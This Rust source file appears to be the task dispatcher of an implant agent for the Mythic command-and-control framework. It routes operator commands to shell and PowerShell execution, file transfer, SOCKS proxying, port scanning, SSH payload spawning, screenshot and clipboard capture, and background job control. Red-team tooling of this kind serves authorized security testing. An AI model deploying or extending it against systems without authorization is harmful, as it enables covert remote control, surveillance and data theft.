// tasking.rs
use crate::{AgentTask, SharedData};
use crate::mythic_error;
use crate::socks::start_socks;
use std::collections::VecDeque;
use std::error::Error;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    mpsc, Arc,
};

// Import all other commands
use crate::{
    cat, cd, clipboard, cp, download, exit, getenv, getprivs, jobs, ls, mkdir, mv, netstat, portscan, ps, pwd,
    redirect, rm, screenshot, setenv, shell, sleep, ssh, unsetenv, upload, workinghours,
};

/// Represents a background task (job)
#[derive(Debug)]
pub struct BackgroundTask {
    pub command: String,
    pub parameters: String,
    pub id: u32,
    pub running: Arc<AtomicBool>,
    pub killable: bool,
    pub uuid: String,
    pub tx: mpsc::Sender<serde_json::Value>,
    pub rx: mpsc::Receiver<serde_json::Value>,
}

/// Main task handler
#[derive(Debug)]
pub struct Tasker {
    pub background_tasks: Vec<BackgroundTask>,
    pub completed_tasks: Vec<serde_json::Value>,
    pub dispatch_val: u32,
    pub cached_ids: VecDeque<u32>,
}

/// Callback prototype for background task threads
type SpawnCbType = fn(
    &mpsc::Sender<serde_json::Value>,
    mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>>;

impl Tasker {
    /// Create a new Tasker
    pub fn new() -> Self {
        Self {
            background_tasks: Vec::new(),
            completed_tasks: Vec::new(),
            dispatch_val: 0,
            cached_ids: VecDeque::new(),
        }
    }

    /// Process all pending tasks from Mythic
    pub fn process_tasks(
        &mut self,
        tasks: Option<&Vec<AgentTask>>,
        agent: &mut SharedData,
    ) -> Result<(), Box<dyn Error>> {
        if let Some(tasks) = tasks {
            for task in tasks.iter() {
                match task.command.as_str() {
                    // --- Background commands ---
                    "download" => self.spawn_bg(task, download::download_file, false)?,
                    "portscan" => self.spawn_bg(task, portscan::scan_ports, true)?,
                    #[cfg(target_os = "windows")]
                    "powershell" => self.spawn_bg(task, shell::run_powershell, false)?,
                    "redirect" => self.spawn_bg(task, redirect::setup_redirect, true)?,
                    "ssh-spawn" => self.spawn_bg(task, ssh::spawn::spawn_payload, false)?,
                    "ssh" => self.spawn_bg(task, ssh::run_ssh, false)?,
                    "socks" => self.spawn_bg(task, start_socks, true)?,
                    "shell" => self.spawn_bg(task, shell::run_cmd, false)?,
                    "upload" => self.spawn_bg(task, upload::upload_file, false)?,

                    // --- Job management ---
                    "jobkill" => {
                        match jobs::kill_job(task, &self.background_tasks) {
                            Ok(res) => self.completed_tasks.extend(res),
                            Err(e) => self.completed_tasks.push(mythic_error!(task.id, e.to_string())),
                        }
                    }

                    // --- Continued background messages ---
                    "continued_task" => {
                        for job in &self.background_tasks {
                            if task.id == job.uuid {
                                match serde_json::to_value(task) {
                                    Ok(msg) => {
                                        if let Err(e) = job.tx.send(msg) {
                                            self.completed_tasks.push(mythic_error!(
                                                task.id,
                                                format!("Send error: {e}")
                                            ));
                                        }
                                    }
                                    Err(e) => self
                                        .completed_tasks
                                        .push(mythic_error!(task.id, e.to_string())),
                                }
                                break;
                            }
                        }
                    }

                    // --- Foreground commands ---
                    _ => {
                        let res = match task.command.as_str() {
                            "sleep" => sleep::set_sleep(
                                task,
                                &mut agent.sleep_interval,
                                &mut agent.jitter,
                            )
                            .unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),

                            "exit" => exit::exit_agent(task, &mut agent.exit_agent),

                            "jobs" => jobs::list_jobs(task, &self.background_tasks),

                            "workinghours" => workinghours::working_hours(task, agent)
                                .unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),

                            "cat" => cat::cat_file(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "cd" => cd::change_dir(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "cp" => cp::copy_file(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "getenv" => getenv::get_env(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "getprivs" => getprivs::get_privileges(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "ls" => ls::make_ls(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "mkdir" => mkdir::make_directory(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "mv" => mv::move_file(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "netstat" => netstat::netstat(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "ps" => ps::get_process_list(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "pwd" => pwd::get_pwd(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "rm" => rm::remove(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "setenv" => setenv::set_env(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "screenshot" => screenshot::take_screenshot(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "clipboard" => clipboard::take_clipboard(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "ssh-agent" => ssh::agent::ssh_agent(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "unsetenv" => unsetenv::unset_env(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),

                            _ => mythic_error!(
                                task.id,
                                format!("Command '{}' not implemented", task.command)
                            ),
                        };
                        self.completed_tasks.push(res);
                    }
                }
            }
        }
        Ok(())
    }

    /// Collect all completed task outputs and queued background messages
    pub fn get_completed_tasks(&mut self) -> Result<Vec<serde_json::Value>, Box<dyn Error>> {
        let mut completed = Vec::new();

        for job in self.background_tasks.iter() {
            while let Ok(msg) = job.rx.try_recv() {
                completed.push(msg);
            }

            if !job.running.load(Ordering::SeqCst) || Arc::strong_count(&job.running) == 1 {
                while let Ok(msg) = job.rx.try_recv() {
                    completed.push(msg);
                }
                job.running.store(false, Ordering::SeqCst);
                self.cached_ids.push_back(job.id);
            }
        }

        self.background_tasks
            .retain(|x| x.running.load(Ordering::SeqCst));
        completed.append(&mut self.completed_tasks);
        Ok(completed)
    }

    /// Generic wrapper for spawning background jobs
    fn spawn_bg(
        &mut self,
        task: &AgentTask,
        callback: SpawnCbType,
        killable: bool,
    ) -> Result<(), Box<dyn Error>> {
        let (tasker_tx, job_rx) = mpsc::channel();
        let (job_tx, tasker_rx) = mpsc::channel();

        // Assign new background ID
        let id = if let Some(id) = self.cached_ids.pop_front() {
            id
        } else {
            self.dispatch_val += 1;
            self.dispatch_val - 1
        };

        let running = Arc::new(AtomicBool::new(true));
        let running_ref = running.clone();
        let uuid = task.id.clone();

        std::thread::spawn(move || {
            if let Err(e) = callback(&job_tx, job_rx) {
                let _ = job_tx.send(mythic_error!(uuid, e.to_string()));
            }
            running_ref.store(false, Ordering::SeqCst);
        });

        tasker_tx.send(serde_json::to_value(task)?)?;

        self.background_tasks.push(BackgroundTask {
            command: task.command.clone(),
            parameters: task.parameters.clone(),
            uuid: task.id.clone(),
            killable,
            id,
            running,
            tx: tasker_tx,
            rx: tasker_rx,
        });
        Ok(())
    }
}
